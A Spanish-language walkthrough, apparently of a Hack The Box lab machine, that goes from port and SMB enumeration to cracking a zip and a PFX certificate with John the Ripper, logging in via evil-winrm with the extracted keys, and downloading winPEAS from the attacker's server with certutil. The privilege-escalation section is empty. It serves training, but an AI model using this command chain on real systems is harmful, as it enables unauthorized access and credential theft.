## Resumen

### Herramientas


## Enumeración
Empezamos haciendo nuestro escaneo de puertos con nmap y podemos observar la típica estructura de puertos que tiene Windows, con puertos importantes como smb, ldap...

```bash
sudo nmap -sS -Pn -p- -T4 --min-rate 5000 10.129.29.196
```

![](Pasted%20image%2020260506165322.png)

Haremos otro escaneo para ver la versión de los servicios ante los que estamos. No hay mucha información relevante, pero si podemos ver el nombre del domino y del CN que hay en el certificado ssl

```bash
sudo nmap -sCV 10.129.29.196
```

![](Pasted%20image%2020260506165846.png)


Listando los shares de SMB podemos ver uno al que tenemos permisos que se llama Shares, así que procederemos a investigarlo

```bash
smbmap -u Guest -p "" -H 10.129.29.196
```

![](Pasted%20image%2020260506170514.png)


Metiéndonos con smbclient, en la carpeta Dev conseguiremos encontrar un zip el cual descargaremos en nuestra máquina para descomprimirlo

```bash
smbclient //10.129.29.196/Shares
```

![](Pasted%20image%2020260506170922.png)

## Explotación
Al intentar descomprimirlo nos pedirá una contraseña la cuál no sabemos, además indica que contiene un fichero llamado legacyy_dev_auth.pfx este tipo de fichero es un formato binario protegido por contraseña que almacena un certificado digital, su clave privada y certificados intermedios en un solo paquete, por lo que al descomprimirlo podemos tener acceso a esas claves y entrar a su sistema

![](Pasted%20image%2020260506171336.png) 

Para crackearlo usaremos zip2john para generar un hash que pueda hacerse fuerza bruta con herramientas para ello como johntheripper. Al  pasarlo por johntheripper nos extraerá al instante la contraseña

```bash
zip2john winrm_backup.zip > winrm_backup.pfx.hash
```

![](Pasted%20image%2020260506171559.png)

```bash
john winrm_backup.pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](Pasted%20image%2020260506171729.png)

Así que ahora descomprimiremos el zip con la credencial. Exitosamente habremos obtenido el fichero previamente comentado

```bash
unzip -P supremelegacy winrm_backup.zip
```

![](Pasted%20image%2020260506171951.png)

Investigando como extraer las claves del fichero he visto que es de la siguiente forma, el problema es que encontramos que necesitamos otra contraseña

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.key
```

![](Pasted%20image%2020260506172325.png)

Para ello existe la herramienta pfx2john que nos extraerá el propio hash para poder crackearlo. Seguidamente usaremos de nuevo johntheripper para obtener la contraseña, tras unos pocos segundos la conseguiremos y ya tendremos la opción de extraer las claves

```bash
pfx2john legacyy_dev_auth.pfx > legacyhash
```

```bash
john legacyhash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](Pasted%20image%2020260506172750.png)

Para extraerlas haremos el comando previamente dado, en este caso usaremos la contraseña extraída. Nos dice que debemos poner al menos 4 caracteres para la contraseña, así que introduciré cualquier cosa como 1234 y ya tendríamos al privada. Y por último el certificado público y ya tendremos los dos ficheros necesarios

![](Pasted%20image%2020260506173127.png) 


![](Pasted%20image%2020260506173242.png)

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out lagacy_publico.crt
```

![](Pasted%20image%2020260506173446.png)

Ahora usaremos evil-winrm para acceder mediante las claves, para ello debemos indicar los dos ficheros y establecer que usa SSL, además el acceso nos pedirá la clave creada con anterioridad que en mi caso era 1234

>[!FLAGS evil-winrm]
>-S indica que es SSL, -c el certificado público, -k la clave privada y -i la ip


```bash
evil-winrm -S -c lagacy_publico.crt -k legacyy_privada.key -i timelapse.htb
```


![](Pasted%20image%2020260506173827.png)

En su escritorio encontraremos la primera flag de la máquina

![](Pasted%20image%2020260506174157.png)


Este usuario no tiene nada interesante como para escalar privilegios. 

![](Pasted%20image%2020260506174344.png)

![](Pasted%20image%2020260506174414.png)  

Enumeraremos el sistema con Winpeas creándonos un servidor python para poder descargarlo desde Windows y poder ejecutarlo

```powershell
certutil -urlcache -f http://10.10.14.180:8000/winPEASx64.exe winPeas.exe
```

```powershell
.\winPeas.exe cmd fast > legacy_winpeas
```

![](Pasted%20image%2020260506174928.png)


## Escalada de privilegios

